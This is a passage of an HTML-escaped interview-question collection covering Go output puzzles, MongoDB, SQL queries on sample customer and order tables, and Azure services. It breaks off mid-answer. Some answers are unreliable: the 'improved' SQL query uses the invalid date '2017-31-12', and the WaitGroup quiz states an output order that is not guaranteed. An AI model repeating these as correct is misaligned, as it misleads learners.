(&#xA;&#x9;&#34;fmt&#34;&#xA;&#x9;&#34;sync&#34;&#xA;&#x9;&#34;time&#34;&#xA;)&#xA;&#xA;func main() {&#xA;&#x9;var wg sync.WaitGroup&#xA;&#xA;&#x9;wg.Add(1)&#xA;&#x9;go func() {&#xA;&#x9;&#x9;time.Sleep(time.Second * 2)&#xA;&#x9;&#x9;fmt.Println(&#34;1&#34;)&#xA;&#x9;&#x9;wg.Done()&#xA;&#x9;}()&#xA;&#xA;&#x9;go func() {&#xA;&#x9;&#x9;fmt.Println(&#34;2&#34;)&#xA;&#x9;}()&#xA;&#xA;&#x9;wg.Wait()&#xA;&#x9;fmt.Println(&#34;3&#34;)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Output: 2 1 3&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://tutorialedge.net/golang/go-waitgroup-tutorial/&#34;&gt;Aritcle about sync/waitgroup&lt;/a&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://golang.org/pkg/sync/&#34;&gt;Golang package sync&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What will be the output of the following block of code?: &lt;pre&gt;&lt;code&gt;package main&#xA;&#xA;import (&#xA;&#x9;&#34;fmt&#34;&#xA;)&#xA;&#xA;func mod1(a []int) {&#xA;&#x9;for i := range a {&#xA;&#x9;&#x9;a[i] = 5&#xA;&#x9;}&#xA;&#xA;&#x9;fmt.Println(&#34;1:&#34;, a)&#xA;}&#xA;&#xA;func mod2(a []int) {&#xA;&#x9;a = append(a, 125) // !&#xA;&#xA;&#x9;for i := range a {&#xA;&#x9;&#x9;a[i] = 5&#xA;&#x9;}&#xA;&#xA;&#x9;fmt.Println(&#34;2:&#34;, a)&#xA;}&#xA;&#xA;func main() {&#xA;&#x9;s1 := []int{1, 2, 3, 4}&#xA;&#x9;mod1(s1)&#xA;&#x9;fmt.Println(&#34;1:&#34;, s1)&#xA;&#xA;&#x9;s2 := []int{1, 2, 3, 4}&#xA;&#x9;mod2(s2)&#xA;&#x9;fmt.Println(&#34;2:&#34;, s2)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Output: &lt;code&gt;&lt;br&gt; 1 [5 5 5 5]&lt;br&gt; 1 [5 5 5 5]&lt;br&gt; 2 [5 5 5 5 5]&lt;br&gt; 2 [1 2 3 4]&lt;br&gt; &lt;/code&gt;&lt;/p&gt; &lt;p&gt;In &lt;code&gt;mod1&lt;/code&gt; a is link, and when we&#39;re using &lt;code&gt;a[i]&lt;/code&gt;, we&#39;re changing &lt;code&gt;s1&lt;/code&gt; value to. But in &lt;code&gt;mod2&lt;/code&gt;, &lt;code&gt;append&lt;/code&gt; creats new slice, and we&#39;re changing only &lt;code&gt;a&lt;/code&gt; value, not &lt;code&gt;s2&lt;/code&gt;.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://golangbot.com/arrays-and-slices/&#34;&gt;Aritcle about arrays&lt;/a&gt;, &lt;a href=&#34;https://blog.golang.org/slices&#34;&gt;Blog post about &lt;code&gt;append&lt;/code&gt;&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What will be the output of the following block of code?: &lt;pre&gt;&lt;code&gt;package main&#xA;&#xA;import (&#xA;&#x9;&#34;container/heap&#34;&#xA;&#x9;&#34;fmt&#34;&#xA;)&#xA;&#xA;// An IntHeap is a min-heap of ints.&#xA;type IntHeap []int&#xA;&#xA;func (h IntHeap) Len() int           { return len(h) }&#xA;func (h IntHeap) Less(i, j int) bool { return h[i] &amp;lt; h[j] }&#xA;func (h IntHeap) Swap(i, j int)      { h[i], h[j] = h[j], h[i] }&#xA;&#xA;func (h *IntHeap) Push(x interface{}) {&#xA;&#x9;// Push and Pop use pointer receivers because they modify the slice&#39;s length,&#xA;&#x9;// not just its contents.&#xA;&#x9;*h = append(*h, x.(int))&#xA;}&#xA;&#xA;func (h *IntHeap) Pop() interface{} {&#xA;&#x9;old := *h&#xA;&#x9;n := len(old)&#xA;&#x9;x := old[n-1]&#xA;&#x9;*h = old[0 : n-1]&#xA;&#x9;return x&#xA;}&#xA;&#xA;func main() {&#xA;&#x9;h := &amp;amp;IntHeap{4, 8, 3, 6}&#xA;&#x9;heap.Init(h)&#xA;&#x9;heap.Push(h, 7)&#xA;&#xA;  fmt.Println((*h)[0])&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Output: 3&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://golang.org/pkg/container/heap/&#34;&gt;Golang container/heap package&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Mongo&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the advantages of MongoDB? Or in other words, why choosing MongoDB and not other implementation of NoSQL?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;MongoDB advantages are as followings:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Schemaless&lt;/li&gt; &#xA;   &lt;li&gt;Easy to scale-out&lt;/li&gt; &#xA;   &lt;li&gt;No complex joins&lt;/li&gt; &#xA;   &lt;li&gt;Structure of a single object is clear&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between SQL and NoSQL?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The main difference is that SQL databases are structured (data is stored in the form of tables with rows and columns - like an excel spreadsheet table) while NoSQL is unstructured, and the data storage can vary depending on how the NoSQL DB is set up, such as key-value pair, document-oriented, etc. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;In what scenarios would you prefer to use NoSQL/Mongo over SQL?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Heterogeneous data which changes often&lt;/li&gt; &lt;li&gt;Data consistency and integrity is not top priority&lt;/li&gt; &lt;li&gt;Best if the database needs to scale rapidly &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a document? What is a collection?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is an aggregator?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is better? Embedded documents or referenced?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Have you performed data retrieval optimizations in Mongo? If not, can you think about ways to optimize a slow data retrieval?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h5&gt;Queries&lt;/h5&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain this query: &lt;code&gt;db.books.find({&#34;name&#34;: /abc/})&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain this query: &lt;code&gt;db.books.find().sort({x:1})&lt;/code&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between find() and find_one()?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can you export data from Mongo DB?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;mongoexport&lt;/li&gt; &lt;li&gt;programming languages &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h2&gt;SQL&lt;/h2&gt; &#xA;&lt;h3&gt;SQL Exercises&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Name&lt;/th&gt; &#xA;   &lt;th&gt;Topic&lt;/th&gt; &#xA;   &lt;th&gt;Objective &amp;amp; Instructions&lt;/th&gt; &#xA;   &lt;th&gt;Solution&lt;/th&gt; &#xA;   &lt;th&gt;Comments&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Functions vs. Comparisons&lt;/td&gt; &#xA;   &lt;td&gt;Query Improvements&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/sql/improve_query.md&#34;&gt;Exercise&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/bregman-arie/devops-exercises/master/exercises/sql/solutions/improve_query.md&#34;&gt;Solution&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;SQL Self Assessment&lt;/h3&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is SQL?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;SQL (Structured Query Language) is a standard language for relational databases (like MySQL, MariaDB, ...).&lt;br&gt; It&#39;s used for reading, updating, removing and creating data in a relational database. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How is SQL Different from NoSQL&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The main difference is that SQL databases are structured (data is stored in the form of tables with rows and columns - like an excel spreadsheet table) while NoSQL is unstructured, and the data storage can vary depending on how the NoSQL DB is set up, such as key-value pair, document-oriented, etc. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;When is it best to use SQL? NoSQL?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;SQL - Best used when data integrity is crucial. SQL is typically implemented with many businesses and areas within the finance field due to it&#39;s ACID compliance.&lt;/p&gt; &lt;p&gt;NoSQL - Great if you need to scale things quickly. NoSQL was designed with web applications in mind, so it works great if you need to quickly spread the same information around to multiple servers&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Additionally, since NoSQL does not adhere to the strict table with columns and rows structure that Relational Databases require, you can store different data types together. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h5&gt;Practical SQL - Basics&lt;/h5&gt; &#xA;&lt;p&gt;For these questions, we will be using the Customers and Orders tables shown below:&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Customers&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Customer_ID&lt;/th&gt; &#xA;   &lt;th&gt;Customer_Name&lt;/th&gt; &#xA;   &lt;th&gt;Items_in_cart&lt;/th&gt; &#xA;   &lt;th&gt;Cash_spent_to_Date&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100204&lt;/td&gt; &#xA;   &lt;td&gt;John Smith&lt;/td&gt; &#xA;   &lt;td&gt;0&lt;/td&gt; &#xA;   &lt;td&gt;20.00&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100205&lt;/td&gt; &#xA;   &lt;td&gt;Jane Smith&lt;/td&gt; &#xA;   &lt;td&gt;3&lt;/td&gt; &#xA;   &lt;td&gt;40.00&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100206&lt;/td&gt; &#xA;   &lt;td&gt;Bobby Frank&lt;/td&gt; &#xA;   &lt;td&gt;1&lt;/td&gt; &#xA;   &lt;td&gt;100.20&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;ORDERS&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Customer_ID&lt;/th&gt; &#xA;   &lt;th&gt;Order_ID&lt;/th&gt; &#xA;   &lt;th&gt;Item&lt;/th&gt; &#xA;   &lt;th&gt;Price&lt;/th&gt; &#xA;   &lt;th&gt;Date_sold&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100206&lt;/td&gt; &#xA;   &lt;td&gt;A123&lt;/td&gt; &#xA;   &lt;td&gt;Rubber Ducky&lt;/td&gt; &#xA;   &lt;td&gt;2.20&lt;/td&gt; &#xA;   &lt;td&gt;2019-09-18&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100206&lt;/td&gt; &#xA;   &lt;td&gt;A123&lt;/td&gt; &#xA;   &lt;td&gt;Bubble Bath&lt;/td&gt; &#xA;   &lt;td&gt;8.00&lt;/td&gt; &#xA;   &lt;td&gt;2019-09-18&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100206&lt;/td&gt; &#xA;   &lt;td&gt;Q987&lt;/td&gt; &#xA;   &lt;td&gt;80-Pack TP&lt;/td&gt; &#xA;   &lt;td&gt;90.00&lt;/td&gt; &#xA;   &lt;td&gt;2019-09-20&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100205&lt;/td&gt; &#xA;   &lt;td&gt;Z001&lt;/td&gt; &#xA;   &lt;td&gt;Cat Food - Tuna Fish&lt;/td&gt; &#xA;   &lt;td&gt;10.00&lt;/td&gt; &#xA;   &lt;td&gt;2019-08-05&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100205&lt;/td&gt; &#xA;   &lt;td&gt;Z001&lt;/td&gt; &#xA;   &lt;td&gt;Cat Food - Chicken&lt;/td&gt; &#xA;   &lt;td&gt;10.00&lt;/td&gt; &#xA;   &lt;td&gt;2019-08-05&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100205&lt;/td&gt; &#xA;   &lt;td&gt;Z001&lt;/td&gt; &#xA;   &lt;td&gt;Cat Food - Beef&lt;/td&gt; &#xA;   &lt;td&gt;10.00&lt;/td&gt; &#xA;   &lt;td&gt;2019-08-05&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100205&lt;/td&gt; &#xA;   &lt;td&gt;Z001&lt;/td&gt; &#xA;   &lt;td&gt;Cat Food - Kitty quesadilla&lt;/td&gt; &#xA;   &lt;td&gt;10.00&lt;/td&gt; &#xA;   &lt;td&gt;2019-08-05&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;100204&lt;/td&gt; &#xA;   &lt;td&gt;X202&lt;/td&gt; &#xA;   &lt;td&gt;Coffee&lt;/td&gt; &#xA;   &lt;td&gt;20.00&lt;/td&gt; &#xA;   &lt;td&gt;2019-04-29&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How would I select all fields from this table?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Select * &lt;br&gt; From Customers; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How many items are in John&#39;s cart?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Select Items_in_cart &lt;br&gt; From Customers &lt;br&gt; Where Customer_Name = &#34;John Smith&#34;; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the sum of all the cash spent across all customers?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Select SUM(Cash_spent_to_Date) as SUM_CASH &lt;br&gt; From Customers; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How many people have items in their cart?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Select count(1) as Number_of_People_w_items &lt;br&gt; From Customers &lt;br&gt; where Items_in_cart &amp;gt; 0; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How would you join the customer table to the order table?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You would join them on the unique key. In this case, the unique key is Customer_ID in both the Customers table and Orders table &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How would you show which customer ordered which items?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Select c.Customer_Name, o.Item &lt;br&gt; From Customers c &lt;br&gt; Left Join Orders o &lt;br&gt; On c.Customer_ID = o.Customer_ID;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Using a with statement, how would you show who ordered cat food, and the total amount of money spent?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;with cat_food as ( &lt;br&gt; Select Customer_ID, SUM(Price) as TOTAL_PRICE &lt;br&gt; From Orders &lt;br&gt; Where Item like &#34;%Cat Food%&#34; &lt;br&gt; Group by Customer_ID &lt;br&gt; ) &lt;br&gt; Select Customer_name, TOTAL_PRICE &lt;br&gt; From Customers c &lt;br&gt; Inner JOIN cat_food f &lt;br&gt; ON c.Customer_ID = f.Customer_ID &lt;br&gt; where c.Customer_ID in (Select Customer_ID from cat_food);&lt;/p&gt; &lt;p&gt;Although this was a simple statement, the &#34;with&#34; clause really shines when a complex query needs to be run on a table before joining to another. With statements are nice, because you create a pseudo temp when running your query, instead of creating a whole new table.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The Sum of all the purchases of cat food weren&#39;t readily available, so we used a with statement to create the pseudo table to retrieve the sum of the prices spent by each customer, then join the table normally. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which of the following queries would you use? &lt;pre&gt;&lt;code&gt;SELECT count(*)                             SELECT count(*)&#xA;FROM shawarma_purchases                     FROM shawarma_purchases&#xA;WHERE                               vs.     WHERE&#xA;  YEAR(purchased_at) == &#39;2017&#39;              purchased_at &amp;gt;= &#39;2017-01-01&#39; AND&#xA;                                            purchased_at &amp;lt;= &#39;2017-31-12&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;pre&gt;&lt;code&gt;SELECT count(*)&#xA;FROM shawarma_purchases&#xA;WHERE&#xA;  purchased_at &amp;gt;= &#39;2017-01-01&#39; AND&#xA;  purchased_at &amp;lt;= &#39;2017-31-12&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;When you use a function (&lt;code&gt;YEAR(purchased_at)&lt;/code&gt;) it has to scan the whole database as opposed to using indexes and basically the column as it is, in its natural state. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Azure&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Azure Portal?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/learn/modules/intro-to-azure-fundamentals/what-is-microsoft-azure&#34;&gt;Microsoft Docs&lt;/a&gt;: &#34;The Azure portal is a web-based, unified console that provides an alternative to command-line tools. With the Azure portal, you can manage your Azure subscription by using a graphical user interface.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Azure Marketplace?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/learn/modules/intro-to-azure-fundamentals/what-is-microsoft-azure&#34;&gt;Microsoft Docs&lt;/a&gt;: &#34;Azure marketplace helps connect users with Microsoft partners, independent software vendors, and startups that are offering their solutions and services, which are optimized to run on Azure.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain availability sets and availability zones&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;An availability set is a logical grouping of VMs that allows Azure to understand how your application is built to provide redundancy and availability. It is recommended that two or more VMs are created within an availability set to provide for a highly available application and to meet the&amp;nbsp;99.95% Azure SLA. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Azure Policy?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the Azure Resource Manager? Can you describe the format for ARM templates?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Azure managed disks&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Azure - Compute&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What Azure compute services are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Azure Virtual Machines&lt;/li&gt; &lt;li&gt;Azure Batch&lt;/li&gt; &lt;li&gt;Azure Service Fabric&lt;/li&gt; &lt;li&gt;Azure Container Instances&lt;/li&gt; &lt;li&gt;Azure Virtual Machine Scale Set?s &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;Azure Virtual Machines&#34; service is used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Windows or Linux virtual machines &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;Azure Virtual Machine Scale Sets&#34; service is used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Scaling Linux or Windows virtual machines used in Azure &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;Azure Functions&#34; service is used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Azure Functions is the serverless compute service of Azure. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;Azure Container Instances&#34; service is used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Running containerized applications (without the need to provision virtual machines). &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;Azure Batch&#34; service is used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Running parallel and high-performance computing applications &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;Azure Service Fabric&#34; service is used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What &#34;Azure Kubernetes&#34; service is used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Azure - Network&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What Azure network services are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What&#39;s an Azure region?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the N-tier architecture?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Azure Storage&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What Azure storage services are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What storage options Azure supports?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Azure Security&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the Azure Security Center? What are some of its features?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;It&#39;s a 